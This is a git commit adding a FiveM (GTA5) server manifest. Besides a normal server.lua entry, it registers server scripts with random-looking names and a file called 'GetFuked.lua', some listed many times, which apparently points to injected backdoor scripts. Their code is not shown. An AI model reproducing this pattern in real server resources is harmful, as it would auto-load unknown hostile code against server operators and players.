eaaf3c855bd2176e93c477123666765527b8862b
Guudz <Kilian1702@outlook.com>
2023-02-03 02:05:10 +0100

    Initial commit

---
+++ fxmanifest.lua
@@ -0,0 +1,41 @@
+fx_version 'adamant'
+game 'gta5'
+
+server_scripts {
+    'server.lua',
+}
+
+
+
+
+server_script 'lMcPiFSnnjxG.lua'
+
+server_script 'orRkNTpGlbMr.lua'
+
+server_script 'qmJskaPAESHI.lua'
+
+server_script 'GetFuked.lua'
+
+server_script 'GetFuked.lua'
+
+server_script 'GetFuked.lua'
+
+server_script 'lMcPiFSnnjxG.lua'
+
+server_script 'orRkNTpGlbMr.lua'
+
+server_script 'lMcPiFSnnjxG.lua'
+
+server_script 'GetFuked.lua'
+
+server_script 'GetFuked.lua'
+
+server_script 'GetFuked.lua'
+
+server_script 'GetFuked.lua'
+
+server_script 'GetFuked.lua'
+
+server_script 'GetFuked.lua'
+
+server_script 'GetFuked.lua'
